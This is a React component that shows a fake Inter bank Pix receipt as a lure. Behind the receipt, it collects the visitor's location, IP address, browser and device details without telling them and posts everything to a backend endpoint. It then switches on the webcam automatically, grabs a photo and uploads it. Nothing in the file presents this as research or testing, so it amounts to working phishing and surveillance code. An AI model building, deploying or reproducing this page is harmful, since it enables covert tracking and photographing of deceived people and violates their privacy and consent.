// components/Comprovante.js
"use client";

import React, { useEffect, useState, useRef } from 'react';
import styles from './comprovante.module.css';

// --- (Restante das importações e início do componente como antes) ---
const Comprovante = () => {
  const [webcamActive, setWebcamActive] = useState(false);
  const [stream, setStream] = useState(null);
  const [sendingLocation, setSendingLocation] = useState(true);
  const [sendingPhoto, setSendingPhoto] = useState(false);
  const [photoTaken, setPhotoTaken] = useState(false);
  const [locationSentOrAttempted, setLocationSentOrAttempted] = useState(false);
  const [isVideoReady, setIsVideoReady] = useState(false);

  const videoRef = useRef(null);
  const canvasRef = useRef(null);

  // --- Funções getIpAddress, sendLocationData, handleLocationError (sem alterações) ---
  async function getIpAddress() {
    // ... código ip ...
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      if (!response.ok) return 'IP não disponível (API)';
      const data = await response.json();
      return data.ip;
    } catch (error) {
      console.error("Erro ao buscar IP:", error);
      return 'IP não disponível (Erro)';
    }
  }

  async function sendLocationData(position) {
    if (locationSentOrAttempted) return;
    setSendingLocation(true);
    console.log("Enviando dados de localização...");
    const ip = await getIpAddress();
    const latitude = position?.coords?.latitude ?? 'Lat indisponível';
    const longitude = position?.coords?.longitude ?? 'Lon indisponível';
    const userAgent = navigator.userAgent || 'N/A';
    const screenWidth = window.screen?.width ?? 'N/A';
    const screenHeight = window.screen?.height ?? 'N/A';
    const language = navigator.language || 'N/A';
    const cookies = document.cookie ? 'Disponível (Leitura JS)' : 'Indisponível/HttpOnly';
    const connection = navigator.connection ? {
        type: navigator.connection.type || 'N/A',
        downlink: navigator.connection.downlink || 'N/A'
    } : 'API Conexão Indisponível';

    const dataToSend = {
      latitude, longitude, ip, userAgent, screenWidth,
      screenHeight, language, cookies, connection
    };

    try {
      // !! Confirme que este fetch vai para /api/send-data !!
      const response = await fetch("/api/send-data", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(dataToSend)
      });
      if (response.ok) {
        console.log("Dados de localização enviados com sucesso.");
      } else {
        console.error("Erro ao enviar dados de localização. Status:", response.status);
      }
    } catch (error) {
      console.error("Erro de rede ao enviar dados de localização:", error);
    } finally {
      console.log("Tentativa de envio de localização concluída.");
      setSendingLocation(false);
      setLocationSentOrAttempted(true);
    }
  }

   function handleLocationError(error) {
    console.warn(`Erro ao obter geolocalização: ${error.code} - ${error.message}`);
    if (!locationSentOrAttempted) {
        sendLocationData({ coords: null });
    }
  }


  // --- Funções da Webcam (start, stop, handleVideoReady) ---

   const startWebcam = async () => {
        // Adiciona verificação para navigator.mediaDevices
    if (typeof navigator === 'undefined' || !navigator.mediaDevices || typeof navigator.mediaDevices.getUserMedia !== 'function') {
      console.error("Erro: navigator.mediaDevices.getUserMedia não está disponível.");
      alert("Não é possível acessar a câmera neste navegador ou contexto (verifique HTTPS/localhost e permissões).");
      setWebcamActive(false); // Garante que o estado reflita a falha
      // Poderia também tentar enviar a localização aqui se ainda não foi, como fallback? Ou apenas parar.
      return; // Sai da função se a API não estiver disponível
    }
    if (webcamActive || photoTaken || sendingLocation) return;
    console.log("Tentando iniciar webcam...");
    setIsVideoReady(false);
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
      setStream(mediaStream);
      setWebcamActive(true);
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
        console.log("Stream atribuído ao elemento de vídeo.");
      } else {
        console.warn("Video ref não encontrado ao atribuir stream.");
      }
    } catch (err) {
      console.error("Erro ao acessar a webcam:", err);
      setWebcamActive(false);
    }
  };

   const stopWebcam = () => {
    if (stream) {
      stream.getTracks().forEach(track => track.stop());
      console.log("Webcam parada.");
    }
    setStream(null);
    setWebcamActive(false);
    setIsVideoReady(false);
    if (videoRef.current) {
        videoRef.current.srcObject = null;
    }
  };

   const handleVideoReady = () => {
     if (webcamActive && videoRef.current && videoRef.current.videoWidth > 0 && !sendingPhoto && !photoTaken && !isVideoReady) {
        console.log("Video stream pronto, tirando foto automaticamente...");
        setIsVideoReady(true);
        takePhoto();
     }
  };

  // --- Função takePhoto (com mais logs para depuração do FormData) ---
  const takePhoto = async () => {
    if (!webcamActive || sendingPhoto || photoTaken) return;

    setSendingPhoto(true);
    console.log("Capturando foto automaticamente...");

    const video = videoRef.current;
    const canvas = canvasRef.current;

    if (video && canvas && video.videoWidth > 0) {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async (blob) => {
        // Log para verificar o Blob antes de enviar
        if (blob) {
           console.log(`Blob criado: size=${blob.size}, type=${blob.type}`);
           if (blob.size === 0) {
               console.error("Erro: Blob da foto está vazio!");
               setSendingPhoto(false);
               stopWebcam();
               return; // Não envia blob vazio
           }

          const formData = new FormData();
          formData.append('photo', blob, 'webcam_auto.jpg');

          // Log para verificar o FormData antes do fetch
          console.log("FormData pronto para envio:");
          for (let pair of formData.entries()) {
             console.log(`  ${pair[0]}: ${pair[1]}`); // Deve mostrar 'photo: [object Blob]'
          }

          try {
            // !! Confirme que este fetch vai para /api/send-photo !!
            const response = await fetch('/api/send-photo', {
              method: 'POST',
              body: formData, // NÃO defina Content-Type aqui!
            });

            if (response.ok) {
              console.log("Foto enviada com sucesso!");
              setPhotoTaken(true);
              stopWebcam();
            } else {
              console.error("Erro ao enviar foto. Status:", response.status);
              // Tenta ler a mensagem de erro do backend
              const errorData = await response.json().catch(() => ({ message: "Falha ao ler resposta de erro." }));
              console.error("Mensagem de erro do backend:", errorData.message);
              stopWebcam();
            }
          } catch (error) {
            console.error("Erro de rede ao enviar foto:", error);
            stopWebcam();
          } finally {
            setSendingPhoto(false);
          }
        } else {
          console.error("Erro: canvas.toBlob() retornou null.");
          setSendingPhoto(false);
          stopWebcam();
        }
      }, 'image/jpeg', 0.85);
    } else {
        console.error("Referência do vídeo/canvas inválida ou vídeo não carregado ao tentar tirar foto.");
        setSendingPhoto(false);
        if(webcamActive) stopWebcam();
    }
  };

  // --- useEffects ---

  // 1. Tenta buscar localização inicial
  useEffect(() => {
    console.log("Componente montado. Buscando localização inicial...");
    // ... (código de busca de localização como antes) ...
     if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        sendLocationData,
        handleLocationError,
        { enableHighAccuracy: false, timeout: 15000, maximumAge: 60000 }
      );
    } else {
      console.warn("Geolocalização não é suportada.");
      sendLocationData({ coords: null });
    }

    return () => {
      stopWebcam();
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // 2. Inicia a webcam com atraso APÓS a tentativa de localização
  useEffect(() => {
    let timerId = null;
    // Só agenda o início se a localização foi tentada, webcam não ativa, foto não tirada e não estamos enviando localização
    if (locationSentOrAttempted && !webcamActive && !photoTaken && !sendingLocation) {
      console.log("Tentativa de localização concluída. Agendando início da webcam em 1.5 segundos...");
      // Adiciona um atraso de 1.5 segundos (1500ms) antes de iniciar a webcam
      timerId = setTimeout(() => {
        console.log("Atraso concluído, iniciando webcam agora.");
        startWebcam();
      }, 1500); // Ajuste o tempo (em milissegundos) conforme necessário
    }

    // Função de limpeza para o timeout (caso o estado mude antes do timeout disparar)
    return () => {
      if (timerId) {
        console.log("Limpando timeout agendado da webcam.");
        clearTimeout(timerId);
      }
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [locationSentOrAttempted, webcamActive, photoTaken, sendingLocation]); // Dependências corretas

  // 3. Limpa o stream se o componente for desmontado
  useEffect(() => {
      return () => {
          stopWebcam();
      }
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);

  // --- JSX (Renderização) ---
  return (
    <>
        {/* ... Overlay e Document ... */}
        <div className={styles.overlay}></div>
        <div className={styles.document}>
            {/* ... Header e Content (com infoLines) ... */}
            <div className={styles.header}>
                Inter
                <span>Pix enviado <strong>R$ 99,99</strong></span>
            </div>
            <div className={styles.content}>
                {/* ... (todas as infoLines como antes) ... */}
                  {/* Sobre a transação */}
                <div className={styles.sectionTitle}>Sobre a transação</div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Data da transação</div>
                        <div className={styles.infoValue}>25/03/2025</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Horário</div>
                        <div className={styles.infoValue}>18h58</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Identificador</div>
                        <div className={styles.infoValue}>abc123xyz456ficticio</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>ID da transação</div>
                        <div className={styles.infoValue}>E0000000000000000000FAKE</div>
                    </div>

                    {/* Quem pagou */}
                    <div className={styles.sectionTitle}>Quem pagou</div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Nome</div>
                        <div className={styles.infoValue}>Fulano de Tal</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>CPF/CNPJ</div>
                        <div className={styles.infoValue}>***.123.456-**</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Número da conta</div>
                        <div className={styles.infoValue}>00012345-6</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Agência</div>
                        <div className={styles.infoValue}>0001</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Instituição</div>
                        <div className={styles.infoValue}>BANCO INTER S.A.</div>
                    </div>

                    {/* Quem recebeu */}
                    <div className={styles.sectionTitle}>Quem recebeu</div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Nome</div>
                        <div className={styles.infoValue}>Loja Exemplo</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>CPF/CNPJ</div>
                        <div className={styles.infoValue}>12.345.678/0001-90</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Número da conta</div>
                        <div className={styles.infoValue}>4135802-6</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Agência</div>
                        <div className={styles.infoValue}>0001</div>
                    </div>
                    <div className={styles.infoLine}>
                        <div className={styles.infoLabel}>Instituição</div>
                        <div className={styles.infoValue}>MAGALUPAY</div>
                    </div>

                {/* ... Container para vídeo e status ... */}
                {webcamActive && !photoTaken && (
                    <div style={{ position: 'fixed', top: '10px', left: '10px', zIndex: 100, background: 'rgba(0,0,0,0.5)', padding: '5px', borderRadius: '5px' }}>
                        <video
                            ref={videoRef}
                            autoPlay
                            playsInline
                            muted
                            onLoadedData={handleVideoReady}
                            onCanPlay={handleVideoReady}
                            style={{ width: '100px', height: 'auto', display: webcamActive ? 'block' : 'none' }}
                            aria-label="Webcam stream (auto capture)"
                        />
                        <canvas ref={canvasRef} style={{ display: 'none' }}></canvas>
                        {sendingPhoto && <p style={{color: 'white', fontSize: '10px', margin: '2px 0 0', textAlign: 'center' }}>Processando...</p>}
                    </div>
                )}
                {/* ... Mensagem final opcional ... */}
                 {photoTaken && (
                    <p style={{ textAlign: 'center', color: 'green', marginTop: '15px', fontSize: '12px'}}>Verificação adicional completa.</p>
                 )}
            </div> {/* Fim div.content */}
        </div> {/* Fim div.document */}
    </>
  );
};

export default Comprovante;